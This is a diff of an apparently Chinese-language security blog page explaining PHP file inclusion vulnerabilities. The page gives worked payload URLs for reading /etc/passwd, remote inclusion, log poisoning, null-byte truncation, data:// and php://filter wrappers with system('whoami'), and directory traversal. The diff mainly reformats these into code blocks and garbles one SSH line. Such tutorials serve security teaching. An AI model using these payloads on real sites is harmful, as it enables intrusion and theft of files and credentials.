@@ -139,7 +139,7 @@
 <meta property="og:image" content="https://i.imgur.com/DFzB7L3.png">
 <meta property="og:image" content="https://i.imgur.com/Tpznihz.png">
 <meta property="og:image" content="https://i.imgur.com/fwBEvdb.png">
-<meta property="og:updated_time" content="2018-12-02T08:54:40.430Z">
+<meta property="og:updated_time" content="2018-12-02T09:11:04.433Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="文件包含漏洞详解">
 <meta name="twitter:description" content="严格来说，文件包含漏洞是“代码注入”的一种，这种攻击其原理就是注入一段用户能控制的脚本或代码，并让服务端执行。 常见的导致文件包含（文件读取）的函数如下： PHP： include()：使用此函数，只有代码执行到此函数时才将文件包含进来，发生错误时只警告并继续执行。  require()：使用此函数，只要程序执行，立即调用此函数包含文件，发生错误时，会输出错误信息并立即终止程序。  require">
@@ -417,7 +417,7 @@
                 
               
 
-              <time title="创建时间：2018-12-02 16:01:44 / 修改时间：16:54:40" itemprop="dateCreated datePublished" datetime="2018-12-02T16:01:44+08:00">2018-12-02</time>
+              <time title="创建时间：2018-12-02 16:01:44 / 修改时间：17:11:04" itemprop="dateCreated datePublished" datetime="2018-12-02T16:01:44+08:00">2018-12-02</time>
             
 
             
@@ -506,16 +506,21 @@
 <li>攻击者能够控制该变量，比如$file = $_GET[‘file’];。</li>
 </ul>
 <h2 id="php的文件包含利用"><a href="#php的文件包含利用" class="headerlink" title="php的文件包含利用"></a>php的文件包含利用</h2><p><strong>在php.ini中，<code>allow_url_fopen</code>默认一直是On，而<code>allow_url_include</code>从php5.2之后就默认为Off。</strong></p>
-<h3 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h3><p>访问：<a href="http://www.test.com/index.php?test=/etc/passwd,如果目标主机存在该文件，并且具有读权限，那么就可以读出文件内容。" target="_blank" rel="noopener">http://www.test.com/index.php?test=/etc/passwd,如果目标主机存在该文件，并且具有读权限，那么就可以读出文件内容。</a></p>
+<h3 id="读取敏感文件"><a href="#读取敏感文件" class="headerlink" title="读取敏感文件"></a>读取敏感文件</h3><p>访问：<code>http://www.test.com/index.php?test=/etc/passwd</code>,如果目标主机存在该文件，并且具有读权限，那么就可以读出文件内容。</p>
 <h3 id="远程包含shell"><a href="#远程包含shell" class="headerlink" title="远程包含shell"></a>远程包含shell</h3><ol>
 <li><code>allow_url_fopen</code> = On</li>
 <li><code>allow_url_include</code> = On</li>
 </ol>
-<p>在远程文件<a href="http://10.60.17.60里写入测试代码。" target="_blank" rel="noopener">http://10.60.17.60里写入测试代码。</a><br><code>&lt;?php fputs(fopen(&quot;text.php&quot;, &quot;w&quot;), &quot;&lt;?php phpinfo(); ?&gt;&quot;) ?&gt;</code><br>  访问<a href="http://127.0.0.1/123.php?file=http://10.60.17.46/phpinfo.php。将会在网站根目录下生成text.php文件，内容就是：&quot;`" target="_blank" rel="noopener">http://127.0.0.1/123.php?file=http://10.60.17.46/phpinfo.php。将会在网站根目录下生成text.php文件，内容就是：&quot;`</a>&lt;?php phpinfo(); ?&gt;`”</p>
+<p>在远程文件<a href="http://10.60.17.60里写入测试代码。" target="_blank" rel="noopener">http://10.60.17.60里写入测试代码。</a></p>
+<pre><code>&lt;?php fputs(fopen(&quot;text.php&quot;, &quot;w&quot;), &quot;&lt;?php phpinfo(); ?&gt;&quot;) ?&gt;
+</code></pre><p>  访问<code>http://127.0.0.1/123.php?file=http://10.60.17.46/phpinfo.php</code>。将会在网站根目录下生成text.php文件，内容就是：”<code>&lt;?php phpinfo(); ?&gt;</code>“</p>
 <p><img src="https://i.imgur.com/wgq7QtT.png" alt=""></p>
 <h3 id="图片上传并包含图片shell"><a href="#图片上传并包含图片shell" class="headerlink" title="图片上传并包含图片shell"></a>图片上传并包含图片shell</h3><p>利用方法和上面的一样，只是这次是本地包含，直接在上传的图片中写入测试代码并访问图片地址即可。</p>
 <h3 id="SSH-log"><a href="#SSH-log" class="headerlink" title="SSH log"></a>SSH log</h3><p><strong>利用条件：</strong>需要知道ssh-log的位置，且可读。默认情况下为 <code>/var/log/auth.log</code></p>
-<p><code>ubuntu@VM-207-93-ubuntu:~$ ssh &#39;&lt;?php phpinfo(); ?&gt;&#39;@remotehost</code></p>
+<pre><code>ubuntu@VM-207-93-ubuntu:~$ ssh &apos;&lt;?php phpinfo(); ?
+</code></pre><blockquote>
+<p>‘@remotehost`</p>
+</blockquote>
 <p>之后会提示输入密码等等，随便输入。</p>
 <p>然后在remotehost的ssh-log中即可写入php代码：</p>
 <p><img src="https://i.imgur.com/CSUgdBp.png" alt=""></p>
@@ -530,15 +535,16 @@
 <p>在一些场景中，log的地址是被修改掉的。你可以通过读取相应的配置文件后，再进行包含。</p>
 <h3 id="长度截断"><a href="#长度截断" class="headerlink" title="长度截断"></a>长度截断</h3><p><strong>利用条件：</strong> php版本 &lt; php 5.2.8</p>
 <p>目录字符串，在linux下<strong>4096字节</strong>时会达到最大值，在window下是<strong>256字节</strong>。只要不断的重复<code>./</code></p>
-<p><code>index.php?file=././././省略././shell.txt</code></p>
-<h3 id="0字节截断包含"><a href="#0字节截断包含" class="headerlink" title="0字节截断包含"></a>0字节截断包含</h3><p><strong>利用条件：</strong> php版本 &lt; php 5.3.4</p>
+<pre><code>index.php?file=././././省略././shell.txt
+</code></pre><h3 id="0字节截断包含"><a href="#0字节截断包含" class="headerlink" title="0字节截断包含"></a>0字节截断包含</h3><p><strong>利用条件：</strong> php版本 &lt; php 5.3.4</p>
 <p>测试代码：</p>
 <pre><code>&lt;?php
     $file = $_GET[&apos;file&apos;];
     include $file.&apos;/tasdas/asd.php&apos;;
 ?&gt;
-</code></pre><p><code>http://127.0.0.1/123.php?file=phpinfo.txt%00</code></p>
-<p><img src="https://i.imgur.com/MkYTX3b.png" alt=""></p>
+
+http://127.0.0.1/123.php?file=phpinfo.txt%00
+</code></pre><p><img src="https://i.imgur.com/MkYTX3b.png" alt=""></p>
 <blockquote>
 <p>正常上传图片一句话并访问：<a href="http://test.com/index.php?test=1.jpg会出错，因为包含文件里面不存在1.jpg.php这个文件，但是如果输入http://test.com/index.php?test=1.jpg%00，就极有可能会绕过检测。这种方法只适用于php.ini中`magic_quotes_qpc=off`并且PHP版本小于5.3.4的情况。如果为on，%00会被转义，以至于无法截断。" target="_blank" rel="noopener">http://test.com/index.php?test=1.jpg会出错，因为包含文件里面不存在1.jpg.php这个文件，但是如果输入http://test.com/index.php?test=1.jpg%00，就极有可能会绕过检测。这种方法只适用于php.ini中`magic_quotes_qpc=off`并且PHP版本小于5.3.4的情况。如果为on，%00会被转义，以至于无法截断。</a></p>
 </blockquote>
@@ -562,12 +568,15 @@
 <h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><ul>
 <li>php版本大于等于php5.2</li>
 <li><code>allow_url_fopen</code> = On</li>
-<li><code>allow_url_include</code> = On</li>
+<li><p><code>allow_url_include</code> = On</p>
+<p>  <a href="http://127.0.0.1/123.php?file=data:text/plain" target="_blank" rel="noopener">http://127.0.0.1/123.php?file=data:text/plain</a>,&lt;?php phpinfo();?&gt;</p>
+</li>
 </ul>
-<p><code>http://127.0.0.1/123.php?file=data:text/plain,&lt;?php phpinfo();?&gt;</code></p>
-<p>任意命令执行<br><code>http://127.0.0.1/123.php?file=data:text/plain,&lt;?php system(&#39;whoami&#39;);?&gt;</code></p>
-<p>利用base64编码绕过<br><code>http://127.0.0.1/123.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></p>
-<blockquote>
+<p>任意命令执行</p>
+<pre><code>http://127.0.0.1/123.php?file=data:text/plain,&lt;?php system(&apos;whoami&apos;);?&gt;
+</code></pre><p>利用base64编码绕过</p>
+<pre><code>http://127.0.0.1/123.php?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
+</code></pre><blockquote>
 <p>加号+的url编码为%2b，PD9waHAgcGhwaW5mbygpOz8+的base64解码为：<code>&lt;?php phpinfo();?&gt;</code></p>
 </blockquote>
 <p><img src="https://i.imgur.com/en29m6p.png" alt=""></p>
@@ -575,11 +584,11 @@
 <h4 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h4><p>php版本大于等于php5.3.0</p>
 <p>在网站根目录下有一个phpinfo.txt内容为&lt;?php phpinfo();?&gt;，打包成压缩包。</p>
 <p>使用绝对路径：</p>
-<p><code>http://127.0.0.1/123.php?file=phar://C:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></p>
-<p><img src="https://i.imgur.com/is1PJIk.png" alt=""></p>
+<pre><code>http://127.0.0.1/123.php?file=phar://C:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt
+</code></pre><p><img src="https://i.imgur.com/is1PJIk.png" alt=""></p>
 <p>或者使用相对路径：</p>
-<p><code>http://127.0.0.1/123.php?file=phar://phpinfo.zip/phpinfo.txt</code></p>
-<p><img src="https://i.imgur.com/w5hVkH8.png" alt=""></p>
+<pre><code>http://127.0.0.1/123.php?file=phar://phpinfo.zip/phpinfo.txt
+</code></pre><p><img src="https://i.imgur.com/w5hVkH8.png" alt=""></p>
 <h4 id="zip-–-zlib-–bzip2-–zip"><a href="#zip-–-zlib-–bzip2-–zip" class="headerlink" title="zip:// – zlib:// –bzip2:// –zip://"></a>zip:// – zlib:// –bzip2:// –zip://</h4><p>php版本大于等于php5.3.0</p>
 <p>构造zip包的方法同phar</p>
 <p>但是使用zip协议，需要指定<strong>绝对路径</strong>，同时将#编码为%23，之后填上压缩包内的文件。</p>
@@ -606,12 +615,12 @@ http://127.0.0.1/test/1.php?f=file=compress.bzip2://./file.jpg
 <h4 id="php-output"><a href="#php-output" class="headerlink" title="php://output"></a>php://output</h4><p>php://output 是一个只写的数据流， 允许你以 print 和 echo 一样的方式 写入到输出缓冲区。</p>
 <h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>对<code>allow_url_include</code> 和<code>allow_url_fopen</code>不做要求。</p>
 <p>在任意文件读取或者getshell会用到这个伪协议。</p>
-<p><code>http://127.0.0.1/123.php?file=php://filter/read=convert.base64-encode/resource=auth.php</code></p>
-<p><img src="https://i.imgur.com/5uTt3Qz.png" alt=""></p>
+<pre><code>http://127.0.0.1/123.php?file=php://filter/read=convert.base64-encode/resource=auth.php
+</code></pre><p><img src="https://i.imgur.com/5uTt3Qz.png" alt=""></p>
 <p>通过指定末尾的文件，可以读取经base64加密后的文件源码，之后再base64解码一下就行。虽然不能直接获取到shell等，但能读取敏感文件危害也是挺大的。</p>
 <p><img src="https://i.imgur.com/6I762D1.png" alt=""></p>
-<p><code>http://127.0.0.1/123.php?file=php://filter/convert.base64-encode/resource=auth.php</code></p>
-<p>效果跟前面一样，少了read关键字。在绕过一些waf时也许有用。</p>
+<pre><code>http://127.0.0.1/123.php?file=php://filter/convert.base64-encode/resource=auth.php
+</code></pre><p>效果跟前面一样，少了read关键字。在绕过一些waf时也许有用。</p>
 <p><img src="https://i.imgur.com/TO2gT9d.png" alt=""></p>
 <p>php://filter类似于readfile()、file()、file_get_contents(),在数据流内容读取之前没有机会应用其他过滤器。</p>
 <p>在include函数使用上，经常会造成任意文件读取漏洞，而<code>file_get_contents()</code>和<code>file_put_contents()</code>这样函数下，常常会构成getshell等更严重的漏洞。</p>
@@ -622,8 +631,8 @@ http://127.0.0.1/test/1.php?f=file=compress.bzip2://./file.jpg
 <li>write=&lt;写链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</li>
 </ul>
 <h4 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h4><p>现在在C:\phpStudy\PHPTutorial\phpinfo.txt文件中有php代码&lt;?php phpinfo();?&gt;，则利用../可以进行目录遍历。</p>
-<p><code>http://127.0.0.1/123.php?file=../phpinfo.txt</code></p>
-<p><img src="https://i.imgur.com/DFzB7L3.png" alt=""></p>
+<pre><code>http://127.0.0.1/123.php?file=../phpinfo.txt
+</code></pre><p><img src="https://i.imgur.com/DFzB7L3.png" alt=""></p>
 <blockquote>
 <p>实际拼接路径为：C:\phpStudy\PHPTutorial\WWW..\phpinfo.txt即C:\phpStudy\PHPTutorial\phpinfo.txt</p>
 </blockquote>
